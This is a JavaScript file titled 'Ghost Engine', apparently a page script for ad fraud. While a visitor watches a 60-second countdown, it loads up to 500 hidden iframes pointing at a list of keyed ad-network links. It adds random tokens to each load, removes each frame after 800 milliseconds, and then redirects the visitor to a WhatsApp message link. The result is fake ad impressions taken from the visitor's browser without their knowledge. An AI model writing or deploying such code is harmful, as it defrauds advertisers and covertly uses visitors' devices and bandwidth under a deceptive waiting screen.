// --- GHOST ENGINE SOURCE ---
const adLinks = [
    "https://www.effectivegatecpm.com/wem43a9fuz?key=c740de57b59023c948d2ca88199fa0a7",
    "https://www.effectivegatecpm.com/gbgp14pkk0?key=bcb67ada445075af2996a14ff824aaae",
    "https://www.effectivegatecpm.com/ycxvjgad?key=36f040245e0cf217e3527f25924168c6",
    "https://www.effectivegatecpm.com/r63wuex0?key=54bf02f132e607b8f84b9f0f52e46098",
    "https://www.effectivegatecpm.com/abu6kcc2?key=fc9bf3d320310a51dfbac565c2f91598",
    "https://www.effectivegatecpm.com/ks6nt2ta?key=d4ac0fb9e7336290e2d2d6a771aa3087",
    "https://www.effectivegatecpm.com/rtbq0mkt3?key=f4a554c622400dcdcb8a903b727ce4a5",
    "https://www.effectivegatecpm.com/wqpk9vnp?key=32f8c0024acf715b88404ec135833f05",
    "https://www.effectivegatecpm.com/eb9m6wfu?key=e0f1c26dbb816d4b5da19b38834fd06b",
    "https://www.effectivegatecpm.com/krwgvpbze9?key=ce73cd789369f89a95ff5213331077a8",
    "https://www.effectivegatecpm.com/weja0bbhde?key=18f15d0d6da9ead46bfd22ba5da8b59b",
    "https://www.effectivegatecpm.com/rtex9s8528?key=62f61a972f2701143e7ccc2fa2cb1f85",
    "https://www.effectivegatecpm.com/ztzrq811?key=89066245485d9341000d856d800e8141",
    "https://www.effectivegatecpm.com/pqm04y0b?key=916d5244a2e5affe8a43de62538b2120",
    "https://www.effectivegatecpm.com/j4a3p6r5?key=7ffdf379dbb0a5ae9acadf724e76ed94",
    "https://www.effectivegatecpm.com/jdk38wbq?key=281ec019dea0eb5050dc7390a7824f0f",
    "https://www.effectivegatecpm.com/fgaerzpfm?key=f0621b7d92baf5a452b5e63820980a50",
    "https://www.effectivegatecpm.com/zk2zxni0b?key=9a957b3daa0250d1fd7d86cc64e045ab",
    "https://www.effectivegatecpm.com/j9yhwft25?key=3cb70a400d5d5b4b20d2081a491509f6",
    "https://www.effectivegatecpm.com/bpkstgca?key=3a645d36a30a8d805276a2e648ccc994"
];

let timeLeft = 60; 
let totalTarget = 500; 
let loadedCount = 0;

function startProcess() {
    document.getElementById('screen-1').style.display = 'none';
    document.getElementById('screen-2').style.display = 'block';

    let timer = setInterval(() => {
        timeLeft--;
        document.getElementById('countdown').innerText = timeLeft;
        if (timeLeft <= 0) {
            clearInterval(timer);
            // APNA REAL WHATSAPP LINK YAHAN DALO
            window.location.href = "https://api.whatsapp.com/send?phone=91XXXXXXXXXX&text=Joined";
        }
    }, 1000);

    runThreadA();
    setTimeout(runThreadB, 150); 
}

function runThreadA() {
    if(loadedCount < totalTarget) {
        spawnAd();
        let delay = Math.floor(Math.random() * (200 - 100 + 1)) + 100;
        setTimeout(runThreadA, delay);
    }
}

function runThreadB() {
    if(loadedCount < totalTarget) {
        spawnAd();
        let delay = Math.floor(Math.random() * (250 - 120 + 1)) + 120;
        setTimeout(runThreadB, delay);
    }
}

function spawnAd() {
    let ifr = document.createElement('iframe');
    ifr.className = 'stealth-frame';
    let rLink = adLinks[Math.floor(Math.random() * adLinks.length)];
    ifr.src = rLink + "&token=" + Date.now() + "_" + Math.floor(Math.random() * 9999);
    document.body.appendChild(ifr);
    loadedCount++;
    setTimeout(() => {
        ifr.src = 'about:blank';
        if(ifr.parentNode) ifr.parentNode.removeChild(ifr);
    }, 800);
}
